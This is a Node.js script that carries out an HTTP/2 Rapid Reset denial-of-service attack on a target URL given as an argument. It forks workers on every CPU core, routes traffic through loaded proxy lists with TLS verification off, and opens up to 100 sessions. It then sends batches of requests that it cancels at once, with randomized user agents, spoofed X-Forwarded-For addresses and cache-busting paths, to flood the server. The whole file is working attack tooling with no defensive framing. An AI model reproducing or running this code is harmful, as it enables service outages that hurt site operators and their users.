// R10-1: RAPID-FIRE - HTTP/2 Rapid Reset Specialist
// Focus: Maximum request rate with minimal CPU
// Technique: Stream cancellation + Connection reuse

const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const url = require('url');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];
let userAgents = [];

// Load proxies and user agents
try {
    proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#') && line.includes(':'));
    console.log(`[R10-1] Loaded ${proxies.length} proxies`);
} catch (e) {
    console.log('[R10-1] No proxy.txt found, running without proxies');
}

try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    console.log(`[R10-1] Loaded ${userAgents.length} user agents`);
} catch (e) {
    console.log('[R10-1] No ua.txt found, using default UAs');
    userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    ];
}

if (cluster.isMaster) {
    console.log(`[R10-1] Master ${process.pid} launching ${CPU_CORES} workers`);
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => {
        process.exit(0);
    }, process.argv[3] * 1000 || 300);
} else {
    const target = process.argv[2];
    const time = process.argv[3] || 300;
    const rate = process.argv[4] || 1000;
    
    startRapidFire(target, time, rate);
}

function createProxiedConnection(proxy, targetHost) {
    return new Promise((resolve, reject) => {
        const [proxyHost, proxyPort] = proxy.split(':');
        
        const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
            socket.write(`CONNECT ${targetHost}:443 HTTP/1.1\r\nHost: ${targetHost}:443\r\n\r\n`);
            
            socket.once('data', () => {
                const tlsSocket = tls.connect({
                    socket: socket,
                    servername: targetHost,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2']
                }, () => {
                    resolve(tlsSocket);
                });
                
                tlsSocket.on('error', reject);
            });
        });
        
        socket.on('error', reject);
    });
}

function startRapidFire(target, time, rate) {
    const parsed = new URL(target);
    const sessions = [];
    let requestCount = 0;
    
    // Create connection pool with proxies
    (async () => {
        for (let i = 0; i < Math.min(100, proxies.length || 100); i++) {
            try {
                let tlsConn;
                
                if (proxies.length > 0) {
                    const proxy = proxies[i % proxies.length];
                    tlsConn = await createProxiedConnection(proxy, parsed.hostname);
                } else {
                    // Direct connection
                    tlsConn = tls.connect({
                        host: parsed.hostname,
                        port: 443,
                        servername: parsed.hostname,
                        rejectUnauthorized: false,
                        ALPNProtocols: ['h2']
                    });
                }
                
                const session = http2.connect(parsed.origin, {
                    createConnection: () => tlsConn
                });
                
                session.on('error', () => {});
                sessions.push(session);
            } catch (e) {
                // Skip failed connections
            }
            
            if (i >= 100) break;
        }
    })();
    
    // Rapid Reset Attack Loop
    const interval = setInterval(() => {
        for (let s = 0; s < sessions.length; s++) {
            const session = sessions[s];
            if (!session || session.destroyed) continue;
            
            // Batch requests for maximum speed
            for (let i = 0; i < 100; i++) {
                try {
                    const ua = userAgents.length > 0 
                        ? userAgents[Math.floor(Math.random() * userAgents.length)]
                        : 'Mozilla/5.0';
                    
                    const headers = {
                        ':method': 'GET',
                        ':path': parsed.pathname + '?' + Math.random().toString(36).substring(7),
                        'user-agent': ua,
                        'accept': '*/*',
                        'cache-control': 'no-cache',
                        'x-forwarded-for': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
                    };
                    
                    const req = session.request(headers);
                    req.on('error', () => {});
                    
                    // IMMEDIATE CANCEL - This is the key!
                    req.close(http2.constants.NGHTTP2_CANCEL);
                    requestCount++;
                } catch (e) {}
            }
        }
    }, 10); // 10ms intervals = 100,000+ RPS
    
    // Show stats
    const statsInterval = setInterval(() => {
        console.log(`[RAPID10-1] RPS: ${requestCount} | Sessions: ${sessions.length}`);
        requestCount = 0;
    }, 1000);
    
    setTimeout(() => {
        clearInterval(interval);
        clearInterval(statsInterval);
        sessions.forEach(s => {
            try { s.destroy(); } catch (e) {}
        });
        process.exit(0);
    }, time * 1000);
}